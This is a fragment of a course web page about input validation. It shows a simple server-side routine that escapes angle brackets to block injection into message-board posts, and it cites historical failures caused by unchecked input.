+  that has the original message, this creates
+  variable <code>newmsg</code> that has the same <a class="glossLink" href="calendar.php-76.html?load=glossary#S">string</a> except
+  that all the &#60;'s have been replaced  with &amp;#60;'s, and
+  all the &#62;'s have been replaced with &amp;#62;'s.
+
+<div class="news" style="clear: right;">
+<b>Consequences of poor <a class="glossLink" href="calendar.php-76.html?load=glossary#I">input validation</a>.</b><br>
+Validating input is always crucial and, in fact, security is just one
+example of why.  There are lots of instances of poor input validation
+causing serious problems without any malicious attacker being involved.
+<p>
+<table>
+  <tr>
+    <td>
+      <b>1999 NASA</b>: The $328 million Mars Climate Orbiter was sent into the Mars atmosphere on the wrong
+      trajectory, causing it to disintegrate. The cause: one piece of software assumed it received
+      input in metric units (newton-sec), but was sent data in English units (pounds-sec).
+    </td>
+    <td width="100" height="100">
+      <img src="calendar-45.php?key=e278523f0100e7df35d2fdcf5a8950b90defdcca&type=lab&event=4" width="100" height="100">
+    </td>
+  </tr>
+</table>
+
+<p>
+<b>2001 Multidata Systems</b>: Cancer treatment software calculated radiation dose based on
+a user-input configuration of lead shielding blocks. Calculations assumed no more
+that four shielding blocks were used, but the software allowed data for five blocks
+to be entered. The result: Cobalt-60 gamma radiation overdosing, an unknown number of
+deaths, and three radiation physicists charged with second-degree murder.
+</p>
+</div>
+
+
+  <pre>
+var newmsg = "";
+var count = 0;
+while(count &lt; msg.length)
+{
+  var nextChar = msg[count];
+  if (nextChar == "&lt;")
+    newmsg = newmsg + "&amp;#60;";
+  else
+    if (nextChar == "&gt;")
+      newmsg = newmsg + "&amp;#62;";
+    else
+      newmsg = newmsg + nextChar;
+  count = count + 1;
+}
+  </pre>
+  Now, would this code be run on the client or on the server?
+  Hopefully by now you realize that it must run on the server,
+  because a bad person could contrive to send the HTTP GET
+  request to the server without going through the client-side
+  validation (just as we saw with server side scripts in the
+  last lesson).
+      
+
+      <p>
+  The above approach does secure us from injection attack, but
+  that security comes at a cost. We can no longer
+  use <em>any</em> HTML in our message board postings.  That
+  means no posting pictures, no using italics and bold face, and
+  no links.  The real trick is to sanitize the input in such a
+  way that we're safe from the bad stuff, but users can still
+  have the power and flexibility to post things like pictures,
+  links, etc.  It's a difficult job, however.  One of the things
+  you should have walked away from the programming part of the
+  course appreciating is that it's hard to write a program that
+  anticipates all the kinds of inputs that a dumb, sloppy or
+  malicious user might throw at you.
+      </p>
+
+
+
+    
+  <!--
+    <p class="sec">
+      <h2>Summary of injection attacks and <a class="glossLink" href="calendar.php?load=glossary#C">cross-site scripting</a></h2>
+      (Read <a href="Summary.pdf">this</a>)
+    </p>
+  -->
+  </body>
+</html>
+
+</div> <!-- /container --></body></html>
